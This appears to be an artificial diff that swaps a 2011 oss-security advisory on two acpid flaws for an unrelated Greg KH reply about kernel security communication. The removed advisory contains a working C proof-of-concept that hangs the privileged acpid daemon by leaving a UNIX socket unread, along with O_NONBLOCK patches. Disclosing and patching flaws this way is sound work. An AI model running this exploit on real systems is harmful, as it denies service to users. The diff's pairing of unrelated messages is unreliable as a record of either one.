@@ -1,155 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/19/4
-Message-ID: <20110119120307.GA7449@albatros>
-Date: Wed, 19 Jan 2011 15:03:07 +0300
-From: Vasiliy Kulikov <segoon@...nwall.com>
-To: oss-security@...ts.openwall.com
-Subject: 2 acpid flaws
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/03/17
+Message-ID: <20110303231601.GA32736@kroah.com>
+Date: Thu, 3 Mar 2011 15:16:01 -0800
+From: Greg KH <greg@...ah.com>
+To: Kees Cook <kees@...ntu.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Vendor-sec hosting and future of closed lists
 Content-Type: text/plain; charset=utf-8
 
-I. Blocking write.
+On Thu, Mar 03, 2011 at 03:09:55PM -0800, Kees Cook wrote:
 
-I.1. Description.
+<good stuff snipped>
 
-acpid informs unprivileged processes about acpi events via UNIX socket.
-This socket is in blocking mode.  If unprivileged process stops reading
-data from the socket then, in some time, the socket queue fills up
-leading to hanging privileged acpid daemon.  The daemon hangs until the
-socket peer process reads some portion of the queued data or the peer
-process exits/is killed.
+> As I see it, the upstream Linux kernel certainly fixes most flaws
+> discovered, and almost gets to fix level 4 (there are so many variations
+> of the Linux kernel running on end-user's systems, I can't blame the
+> Linux kernel upstream for not offering a patch for every version the
+> majority of their end-users use). Where I am disappointed is in the
+> communication.
 
-On Linux 2.6.35 the queue fills up after 208 acpi events.  On the
-testing laptop one "BATTERY" event is emitted every 2-3 minutes, it is
-equivalent of 6-10 hours before triggering the hanging.
+Ok, that's fair enough, I will not disagree with that.
 
-I.2. Exploit.
+> It's generally somewhere between communication style
+> 1 and 2. There is no central list of fixed flaws (style 3, see almost
+> every major upstream's website and append some variation "/security"
+> to the url, etc), and certainly no central list of fixes. There is
+> frequently no mention of the implication of a flaw in commits (style 2),
+> and nothing like style 4, 5, or 6 happening. The only place these things
+> happen are in each distro's bug trackers, or scattered in the Mitre CVE
+> links (which almost invalidates anything above fix level 2 since there is
+> no certain way to find a flaw's fix in an upstream stable kernel update).
+> 
+> So yes, I'm disappointed in the upstream Linux kernel's security flaw
+> fix communications. And while I'm sure some people may not agree with me,
+> I know many do.
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <errno.h>
-#include <sys/un.h>
-#include <fcntl.h>
-#include <unistd.h>
+Then, as I have always said, someone needs to step up and actually do
+this type of communication work.  I personally don't have the time to, I
+am swamped with just getting the stable updates out in a semi-timely
+fashion.  Digging through every patch in these releases and properly
+conveying the real, or percieved reason why they are needed, is a lot of
+thankless work.  Jon at lwn.net tried it for just one release, and we
+are averaging about one a week (total number of kernels released that
+is).  No one else has yet tried to do that, but if they will, I will be
+_glad_ to point my release notifications at that summary.
 
-/* Tested on acpid-1.0.10 (Ubuntu 10.04) */
+So in other words, help is gladly accepted :)
 
-int ud_connect(const char *name)
-{
-	int fd;
-	int r;
-	struct sockaddr_un addr;
+thanks,
 
-	fd = socket(AF_UNIX, SOCK_STREAM, 0);
-	if (fd < 0) {
-		perror("socket");
-		return fd;
-	}
-
-	memset(&addr, 0, sizeof(addr));
-	addr.sun_family = AF_UNIX;
-	sprintf(addr.sun_path, "%s", name);
-
-	r = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
-	if (r < 0) {
-		perror("connect");
-		close(fd);
-		return r;
-	}
-
-	return fd;
-}
-
-int main(int argc, char *argv[])
-{
-	int fd;
-	char c;
-
-	if (argc != 2) {
-		fprintf(stderr, "Usage: prog fname\n");
-		exit(1);
-	}
-
-	fd = ud_connect(argv[1]);
-	if (fd < 0)
-		exit(1);
-	printf("\"Hanging\" socket opened, fd = %d\n", fd);
-
-	fd = ud_connect(argv[1]);
-	if (fd < 0)
-		exit(1);
-	printf("Normal socket opened, fd = %d\n", fd);
-
-	while (1) {
-		static int n;
-		read(fd, &c, 1);
-		fflush(stdout);
-		if (c == '\n') {
-			printf("%d messages in queue\n", ++n);
-		}
-	}
-}
-
-
-I.3. Possible patch.
-
---- a/acpid.c
-+++ b/acpid.c
-@@ -307,6 +307,7 @@
-                                non_root_clients++;
-                        }
-                        fcntl(cli_fd, F_SETFD, FD_CLOEXEC);
-+                       fcntl(cli_fd, F_SETFL, O_NONBLOCK);
-                        snprintf(buf, sizeof(buf)-1, "%d[%d:%d]",
-                                creds.pid, creds.uid, creds.gid);
-                        acpid_add_client(cli_fd, buf);
---
-
-
-II. Incorrect accept(2) error handling.
-
-II.1. Description.
-
-acpid doesn't gracefully handle client disconnection before the call to
-accept(2).  If client calls close(2) between acpid calls poll(2) and
-accept(2), acpid would hang in accept(2) until new client connects to
-/var/run/acpid.socket.
-
-This is only theoretical flaw as with current Linux kernel
-implementation accept(2) would return new socket handler even if the
-peer is closed.  However this behavior is implementation specific and
-may be changed in future versions of kernels (or custom versions).
-
-II.2. Exploit.
-
-None known.
-
-II.3. Possible patch.
-
---- a/acpid.c
-+++ b/acpid.c
-@@ -136,6 +136,7 @@
-                        exit(EXIT_FAILURE);
-                }
-                fcntl(sock_fd, F_SETFD, FD_CLOEXEC);
-+               fcntl(sock_fd, F_SETFL, O_NONBLOCK);
-                chmod(socketfile, socketmode);
-                if (socketgroup) {
-                        struct group *gr;
---
-
-
-P.S. Ideally fcntl()s' return codes should be cheched, but in this case
-all other fcntl/chmod/getsockopt/etc. calls should be checked too.  Such
-a massive rework is probably not related to the subject.
-
-
-[1] http://acpid.sourceforge.net/
-
-
-Thanks,
-
--- 
-Vasiliy
+greg k-h
